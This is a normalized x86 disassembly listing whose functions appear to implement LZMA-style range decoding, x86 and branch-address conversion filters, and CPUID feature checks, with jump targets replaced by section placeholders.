mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
xor eax eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
mov [ ebp - 0x8 ] edx
mov esp ebp
pop ebp
retn
sub_407b20
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] 0x0
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
mov eax [ edx + 0x4 ]
call eax
add esp 0xc
mov esp ebp
pop ebp
retn
sub_407b60
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ ebp - 0x4 ] sub_4079c0
mov [ ebp - 0x4 ] sub_407910
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] sub_407a70
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] sub_407a90
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc ] sub_407b20
mov esp ebp
pop ebp
retn
sub_407bd0
push ebp
mov ebp esp
sub esp 0x24c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x224 ] 0x0
mov [ ebp - 0x210 ] 0x0
mov [ ebp - 0x209 ] 0x0
mov [ ebp - 0x240 ] 0x0
jmp r-xdata
cmp [ ebp - 0x240 ] 0x102
jae r-xdata
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x218 ] eax
mov ecx [ ebp - 0x218 ]
add ecx [ ebp + 0x24 ]
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x220 ] 0x0
mov [ ebp - 0x21c ] 0xffffffff
mov [ ebp - 0x248 ] 0x0
jmp r-xdata
mov ecx 0x400
mov edx [ ebp - 0x240 ]
mov [ ebp + edx * 2 - 0x208 ] cx
jmp r-xdata
cmp [ ebp - 0x248 ] 0x5
jge r-xdata
mov eax [ ebp - 0x240 ]
add eax 0x1
mov [ ebp - 0x240 ] eax
cmp [ ebp + 0x2c ] 0x0
jne r-xdata
mov eax [ ebp - 0x218 ]
cmp eax [ ebp - 0x244 ]
jne r-xdata
mov edx [ ebp + 0xc ]
sub edx [ ebp - 0x224 ]
mov [ ebp - 0x228 ] edx
mov eax [ ebp + 0x2c ]
sub eax [ ebp - 0x210 ]
cmp eax [ ebp - 0x228 ]
jae r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x220 ]
shl ecx 0x8
mov edx [ ebp - 0x218 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0x220 ] ecx
mov ecx [ ebp - 0x218 ]
add ecx 0x1
mov [ ebp - 0x218 ] ecx
jmp r-xdata
mov eax 0x1
jmp r-xdata
cmp [ ebp - 0x228 ] 0x0
je r-xdata
mov ecx [ ebp + 0x2c ]
sub ecx [ ebp - 0x210 ]
mov [ ebp - 0x228 ] ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x248 ]
add edx 0x1
mov [ ebp - 0x248 ] edx
cmp [ ebp - 0x228 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x224 ]
mov al [ edx ]
mov [ ebp - 0x212 ] al
mov ecx [ ebp + 0x28 ]
add ecx [ ebp - 0x210 ]
mov dl [ ebp - 0x212 ]
mov [ ecx ] dl
mov eax [ ebp - 0x210 ]
add eax 0x1
mov [ ebp - 0x210 ] eax
movzx ecx [ ebp - 0x212 ]
and ecx 0xfe
cmp ecx 0xe8
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x210 ]
cmp ecx [ ebp + 0x2c ]
jne r-xdata
jmp r-xdata
movzx edx [ ebp - 0x209 ]
cmp edx 0xf
jne r-xdata
mov ecx [ ebp - 0x210 ]
cmp ecx [ ebp + 0x2c ]
jne r-xdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x224 ]
mov al [ edx ]
mov [ ebp - 0x211 ] al
mov ecx [ ebp - 0x224 ]
add ecx 0x1
mov [ ebp - 0x224 ] ecx
movzx edx [ ebp - 0x211 ]
cmp edx 0xe8
jne r-xdata
mov ecx [ ebp - 0x224 ]
add ecx 0x1
mov [ ebp - 0x224 ] ecx
mov dl [ ebp - 0x212 ]
mov [ ebp - 0x209 ] dl
mov eax [ ebp - 0x228 ]
sub eax 0x1
mov [ ebp - 0x228 ] eax
jmp r-xdata
movzx eax [ ebp - 0x212 ]
and eax 0xf0
cmp eax 0x80
jne r-xdata
mov [ ebp - 0x24c ] 0x1
mov [ ebp - 0x24c ] 0x0
jmp r-xdata
movzx edx [ ebp - 0x211 ]
cmp edx 0xe9
jne r-xdata
movzx eax [ ebp - 0x209 ]
lea ecx [ ebp + eax * 2 - 0x208 ]
mov [ ebp - 0x230 ] ecx
jmp r-xdata
mov eax [ ebp - 0x24c ]
lea ecx [ ebp - 0x6 ]
mov [ ebp - 0x230 ] ecx
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x230 ] eax
jmp r-xdata
mov edx [ ebp - 0x230 ]
movzx eax [ edx ]
mov [ ebp - 0x22c ] eax
mov ecx [ ebp - 0x21c ]
shr ecx 0xb
imul ecx [ ebp - 0x22c ]
mov [ ebp - 0x23c ] ecx
mov edx [ ebp - 0x220 ]
cmp edx [ ebp - 0x23c ]
jae r-xdata
mov ecx [ ebp - 0x21c ]
sub ecx [ ebp - 0x23c ]
mov [ ebp - 0x21c ] ecx
mov edx [ ebp - 0x220 ]
sub edx [ ebp - 0x23c ]
mov [ ebp - 0x220 ] edx
mov eax [ ebp - 0x22c ]
shr eax 0x5
mov ecx [ ebp - 0x22c ]
sub ecx eax
mov edx [ ebp - 0x230 ]
mov [ edx ] cx
cmp [ ebp - 0x21c ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x23c ]
mov [ ebp - 0x21c ] eax
mov ecx 0x800
sub ecx [ ebp - 0x22c ]
shr ecx 0x5
add ecx [ ebp - 0x22c ]
mov edx [ ebp - 0x230 ]
mov [ edx ] cx
cmp [ ebp - 0x21c ] 0x1000000
jae r-xdata
movzx eax [ ebp - 0x211 ]
cmp eax 0xe8
jne r-xdata
mov eax [ ebp - 0x218 ]
cmp eax [ ebp - 0x244 ]
jne r-xdata
mov al [ ebp - 0x211 ]
mov [ ebp - 0x209 ] al
jmp r-xdata
mov eax [ ebp - 0x218 ]
cmp eax [ ebp - 0x244 ]
jne r-xdata
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x234 ] ecx
cmp [ ebp + 0x1c ] 0x4
jae r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x234 ] ecx
cmp [ ebp + 0x14 ] 0x4
jae r-xdata
mov ecx [ ebp - 0x21c ]
shl ecx 0x8
mov [ ebp - 0x21c ] ecx
mov edx [ ebp - 0x220 ]
shl edx 0x8
mov eax [ ebp - 0x218 ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0x220 ] edx
mov edx [ ebp - 0x218 ]
add edx 0x1
mov [ ebp - 0x218 ] edx
mov eax 0x1
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x21c ]
shl ecx 0x8
mov [ ebp - 0x21c ] ecx
mov edx [ ebp - 0x220 ]
shl edx 0x8
mov eax [ ebp - 0x218 ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0x220 ] edx
mov edx [ ebp - 0x218 ]
add edx 0x1
mov [ ebp - 0x218 ] edx
mov eax 0x1
jmp r-xdata
mov edx [ ebp + 0x18 ]
add edx 0x4
mov [ ebp + 0x18 ] edx
mov eax [ ebp + 0x1c ]
sub eax 0x4
mov [ ebp + 0x1c ] eax
mov eax 0x1
jmp r-xdata
mov edx [ ebp + 0x10 ]
add edx 0x4
mov [ ebp + 0x10 ] edx
mov eax [ ebp + 0x14 ]
sub eax 0x4
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0x238 ]
shr ecx 0x8
mov edx [ ebp + 0x28 ]
add edx [ ebp - 0x210 ]
mov [ edx ] cl
mov eax [ ebp - 0x210 ]
add eax 0x1
mov [ ebp - 0x210 ] eax
mov ecx [ ebp - 0x210 ]
cmp ecx [ ebp + 0x2c ]
jne r-xdata
jmp r-xdata
mov ecx 0x1
imul ecx ecx 0x0
mov edx [ ebp - 0x234 ]
movzx eax [ edx + ecx ]
shl eax 0x18
mov ecx 0x1
shl ecx 0x0
mov edx [ ebp - 0x234 ]
movzx ecx [ edx + ecx ]
shl ecx 0x10
or eax ecx
mov edx 0x1
shl edx 0x1
mov ecx [ ebp - 0x234 ]
movzx edx [ ecx + edx ]
shl edx 0x8
or eax edx
mov ecx 0x1
imul ecx ecx 0x3
mov edx [ ebp - 0x234 ]
movzx ecx [ edx + ecx ]
or eax ecx
mov edx [ ebp - 0x210 ]
add edx 0x4
sub eax edx
mov [ ebp - 0x238 ] eax
mov eax [ ebp + 0x28 ]
add eax [ ebp - 0x210 ]
mov cl [ ebp - 0x238 ]
mov [ eax ] cl
mov edx [ ebp - 0x210 ]
add edx 0x1
mov [ ebp - 0x210 ] edx
mov eax [ ebp - 0x210 ]
cmp eax [ ebp + 0x2c ]
jne r-xdata
mov edx [ ebp - 0x238 ]
shr edx 0x10
mov eax [ ebp + 0x28 ]
add eax [ ebp - 0x210 ]
mov [ eax ] dl
mov ecx [ ebp - 0x210 ]
add ecx 0x1
mov [ ebp - 0x210 ] ecx
mov edx [ ebp - 0x210 ]
cmp edx [ ebp + 0x2c ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x238 ]
shr eax 0x18
mov [ ebp - 0x209 ] al
mov ecx [ ebp + 0x28 ]
add ecx [ ebp - 0x210 ]
mov dl [ ebp - 0x209 ]
mov [ ecx ] dl
mov eax [ ebp - 0x210 ]
add eax 0x1
mov [ ebp - 0x210 ] eax
jmp r-xdata
sub_408160
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0xc ] 0x4
jae r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x4
mov [ ebp + 0xc ] eax
mov ecx [ ebp + 0x10 ]
add ecx 0x8
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0x3 ]
cmp edx 0xeb
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x2 ]
shl ecx 0x10
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx + 0x1 ]
shl eax 0x8
or ecx eax
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0xc ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x4
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x10 ]
add eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
sub ecx eax
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
shr edx 0x2
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
shr eax 0x10
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ecx + 0x2 ] al
mov edx [ ebp - 0x8 ]
shr edx 0x8
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] dl
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
mov dl [ ebp - 0x8 ]
mov [ ecx ] dl
sub_408250
push ebp
mov ebp esp
sub esp 0x28
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
and ecx 0x7
mov [ ebp - 0x10 ] ecx
cmp [ ebp + 0xc ] 0x5
jae r-xdata
mov edx [ ebp + 0x10 ]
add edx 0x5
mov [ ebp + 0x10 ] edx
mov [ ebp - 0x14 ] 0xffffffff
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
sub edx [ ebp + 0x8 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x20 ]
jb r-xdata
mov eax [ ebp - 0x8 ]
movzx ecx [ eax ]
and ecx 0xfe
cmp ecx 0xe8
jne r-xdata
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x14 ] 0x3
jbe r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x14 ]
sub ecx 0x1
mov edx [ ebp - 0x10 ]
shl edx cl
and edx 0x7
mov [ ebp - 0x10 ] edx
je r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x3
jbe r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
mov ecx 0x1
shl ecx 0x2
mov edx [ ebp - 0x8 ]
movzx eax [ edx + ecx ]
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
movzx ecx [ eax + r--data ]
mov edx 0x4
sub edx ecx
mov eax [ ebp - 0x8 ]
mov cl [ eax + edx ]
mov [ ebp - 0x1 ] cl
mov edx [ ebp - 0x10 ]
movzx eax [ edx + r--data ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x14 ]
sub ecx 0x1
mov edx [ ebp - 0x10 ]
shl edx cl
and edx 0x7
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov ecx 0x1
shl ecx 0x2
mov edx [ ebp - 0x8 ]
movzx eax [ edx + ecx ]
shl eax 0x18
mov ecx 0x1
imul ecx ecx 0x3
mov edx [ ebp - 0x8 ]
movzx ecx [ edx + ecx ]
shl ecx 0x10
or eax ecx
mov edx 0x1
shl edx 0x1
mov ecx [ ebp - 0x8 ]
movzx edx [ ecx + edx ]
shl edx 0x8
or eax edx
mov ecx 0x1
shl ecx 0x0
mov edx [ ebp - 0x8 ]
movzx ecx [ edx + ecx ]
or eax ecx
mov [ ebp - 0x1c ] eax
mov ecx 0x1
shl ecx 0x2
mov edx [ ebp - 0x8 ]
movzx eax [ edx + ecx ]
cmp eax 0xff
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
shl ecx 0x1
and ecx 0x7
or ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
jmp r-xdata
movzx ecx [ ebp - 0x1 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x28 ]
mov [ eax ] ecx
mov eax [ ebp - 0xc ]
mov eax [ ebp + 0x10 ]
add eax [ ebp - 0xc ]
mov ecx [ ebp - 0x1c ]
sub ecx eax
mov [ ebp - 0x18 ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp - 0xc ]
add edx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
shl ecx 0x1
and ecx 0x7
or ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx - 0x4 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
movzx edx [ ebp - 0x1 ]
cmp edx 0xff
jne r-xdata
mov edx [ ebp - 0x10 ]
movzx eax [ edx + r--data ]
shl eax 0x3
mov [ ebp - 0x24 ] eax
mov ecx 0x18
sub ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x18 ]
shr edx cl
mov [ ebp - 0x2 ] dl
movzx eax [ ebp - 0x2 ]
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov ecx 0x20
sub ecx [ ebp - 0x24 ]
mov edx 0x1
shl edx cl
sub edx 0x1
xor edx [ ebp - 0x18 ]
mov [ ebp - 0x1c ] edx
jmp r-xdata
movzx ecx [ ebp - 0x2 ]
cmp ecx 0xff
je r-xdata
mov eax [ ebp - 0x18 ]
shr eax 0x18
and eax 0x1
sub eax 0x1
not eax
mov ecx 0x1
shl ecx 0x2
mov edx [ ebp - 0x8 ]
mov [ edx + ecx ] al
mov eax [ ebp - 0x18 ]
shr eax 0x10
mov ecx 0x1
imul ecx ecx 0x3
mov edx [ ebp - 0x8 ]
mov [ edx + ecx ] al
mov eax [ ebp - 0x18 ]
shr eax 0x8
mov ecx 0x1
shl ecx 0x1
mov edx [ ebp - 0x8 ]
mov [ edx + ecx ] al
mov eax 0x1
shl eax 0x0
mov ecx [ ebp - 0x8 ]
mov dl [ ebp - 0x18 ]
mov [ ecx + eax ] dl
mov eax [ ebp - 0xc ]
add eax 0x5
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
jmp r-xdata
jmp r-xdata
sub_408520
push ebp
mov ebp esp
pushfd
pop eax
mov edx eax
xor eax [ ebp + 0x8 ]
push eax
popfd
pushfd
pop eax
xor eax edx
push edx
popfd
and [ ebp + 0x8 ] eax
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_408540
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
xor ecx ecx
xor edx edx
mov eax [ ebp + 0x8 ]
cpuid
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ edx ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0xc ]
mov [ ecx ] edx
mov eax [ ebp + 0x18 ]
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_4085a0
push ebp
mov ebp esp
push 0x40000
call sub_408520
add esp 0x4
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push 0x200000
call sub_408520
add esp 0x4
test eax eax
jne r-xdata
pop ebp
retn
mov eax 0x4
shl eax 0x0
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax + 0x4 ]
push edx
mov eax 0x4
shl eax 0x1
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax + 0x4 ]
push edx
mov eax 0x4
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax + 0x4 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
push 0x0
call sub_408540
add esp 0x14
mov ecx [ ebp + 0x8 ]
add ecx 0x1c
push ecx
mov edx [ ebp + 0x8 ]
add edx 0x18
push edx
mov eax [ ebp + 0x8 ]
add eax 0x14
push eax
mov ecx [ ebp + 0x8 ]
add ecx 0x10
push ecx
push 0x1
call sub_408540
add esp 0x14
mov eax 0x1
sub_408640
push ebp
mov ebp esp
sub esp 0x8
push esi
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jae r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0x4 ]
imul ecx ecx 0xc
add ecx rw-data
mov [ ebp - 0x8 ] ecx
mov edx 0x4
imul edx edx 0x0
mov eax 0x4
imul eax eax 0x0
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
mov edx [ ecx + edx ]
cmp edx [ esi + eax + 0x4 ]
jne r-xdata
jmp r-xdata
mov eax 0x4
shl eax 0x0
mov ecx 0x4
shl ecx 0x0
mov edx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax [ edx + eax ]
cmp eax [ esi + ecx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx 0x4
shl ecx 0x1
mov edx 0x4
shl edx 0x1
mov eax [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
mov ecx [ eax + ecx ]
cmp ecx [ esi + edx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_4086e0
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
call sub_4085a0
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
shr ecx 0x8
and ecx 0xff00f
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x14 ]
shr edx 0x4
and edx 0xf00f
mov [ ebp - 0x2c ] edx
lea eax [ ebp - 0x24 ]
push eax
call sub_408640
add esp 0x4
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x40 ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
je r-xdata
mov eax 0x1
jmp r-xdata
cmp [ ebp - 0x28 ] 0x6
jb r-xdata
cmp [ ebp - 0x30 ] 0x1
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov [ ebp - 0x34 ] 0x1
cmp [ ebp - 0x28 ] 0x6
jne r-xdata
cmp [ ebp - 0x28 ] 0x5
jb r-xdata
cmp [ ebp - 0x30 ] 0x2
je r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
cmp [ ebp - 0x2c ] 0x100c
je r-xdata
mov [ ebp - 0x38 ] 0x1
cmp [ ebp - 0x28 ] 0x5
jne r-xdata
cmp [ ebp - 0x28 ] 0x6
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x34 ]
jmp r-xdata
mov [ ebp - 0x38 ] 0x0
jmp r-xdata
cmp [ ebp - 0x2c ] 0x6
jb r-xdata
mov [ ebp - 0x3c ] 0x1
cmp [ ebp - 0x28 ] 0x6
jne r-xdata
mov eax 0x1
mov eax [ ebp - 0x38 ]
jmp r-xdata
cmp [ ebp - 0x2c ] 0xa
je r-xdata
mov [ ebp - 0x3c ] 0x0
jmp r-xdata
cmp [ ebp - 0x2c ] 0xf
jb r-xdata
mov eax [ ebp - 0x3c ]
jmp r-xdata
sub_4087f0
push ebp
mov ebp esp
sub esp 0x8
push esi
movzx eax [ ebp + 0x8 ]
cmp eax 0x28
jle r-xdata
movzx ecx [ ebp + 0x8 ]
cmp ecx 0x28
jne r-xdata
mov eax 0x4
jmp r-xdata
movzx esi [ ebp + 0x8 ]
and esi 0x1
or esi 0x2
movzx eax [ ebp + 0x8 ]
cdq
sub eax edx
sar eax 0x1
add eax 0xb
mov ecx eax
shl esi cl
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] edx
mov eax 0x1
imul eax eax 0x0
mov ecx [ ebp + 0xc ]
mov [ ecx + eax ] 0x4
mov edx 0x1
shl edx 0x0
mov eax [ ebp + 0xc ]
mov cl [ ebp - 0x4 ]
mov [ eax + edx ] cl
mov edx [ ebp - 0x4 ]
shr edx 0x8
mov eax 0x1
shl eax 0x1
mov ecx [ ebp + 0xc ]
mov [ ecx + eax ] dl
mov edx [ ebp - 0x4 ]
shr edx 0x10
mov eax 0x1
imul eax eax 0x3
mov ecx [ ebp + 0xc ]
mov [ ecx + eax ] dl
mov edx [ ebp - 0x4 ]
shr edx 0x18
mov eax 0x1
shl eax 0x2
mov ecx [ ebp + 0xc ]
mov [ ecx + eax ] dl
xor eax eax
sub_4088b0
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
movzx ecx [ ebp + 0xc ]
push ecx
call sub_4087f0
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
push 0x5
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40ba80
add esp 0x10
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_408910
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax + 0x78 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x80 ] 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x84 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x88 ] 0x1
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40b430
add esp 0x4
pop ebp
retn
sub_408960
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x78 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x5
ja r-xdata
mov eax 0x9
mov edx [ ebp - 0x4 ]
jmp [ edx * 4 + jump_table_408b64 ]
mov eax [ ebp + 0x8 ]
mov cl [ ebp + 0xc ]
mov [ eax + 0x7c ] cl
mov edx [ ebp + 0x8 ]
movzx eax [ edx + 0x7c ]
test eax eax
jne r-xdata
movzx eax [ ebp + 0xc ]
shl eax 0x8
mov ecx [ ebp + 0x8 ]
or eax [ ecx + 0x74 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x74 ] eax
mov eax 0x2
jmp r-xdata
movzx eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
or eax [ ecx + 0x74 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x74 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x74 ] ecx
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0x7c ]
and ecx 0x80
jne r-xdata
movzx edx [ ebp + 0xc ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x70 ] edx
mov eax 0x4
jmp r-xdata
movzx ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
or ecx [ edx + 0x70 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x70 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x70 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x70 ] edx
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + 0x7c ]
sar edx 0x5
and edx 0x3
cmp edx 0x2
jl r-xdata
movzx edx [ ebp + 0xc ]
cmp edx 0xe1
jl r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + 0x7c ]
and edx 0x80
jne r-xdata
mov eax 0x8
jmp r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x8 ] 0x3
mov [ ebp - 0x8 ] 0x6
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x5
jmp r-xdata
movzx eax [ ebp + 0xc ]
cdq
mov ecx 0x9
idiv ecx
mov [ ebp - 0x14 ] edx
movzx eax [ ebp + 0xc ]
cdq
mov ecx 0x9
idiv ecx
mov [ ebp + 0xc ] al
movzx eax [ ebp + 0xc ]
cdq
mov ecx 0x5
idiv ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
movzx eax [ ebp + 0xc ]
cdq
mov ecx 0x5
idiv ecx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x18 ]
cmp edx 0x4
jle r-xdata
mov eax 0x9
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0x7c ]
and ecx 0x1f
shl ecx 0x10
mov edx [ ebp + 0x8 ]
mov [ edx + 0x74 ] ecx
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0x7c ]
and ecx 0x7f
cmp ecx 0x2
jle r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0xc ] 0x6
mov [ ebp - 0xc ] 0x9
jmp r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
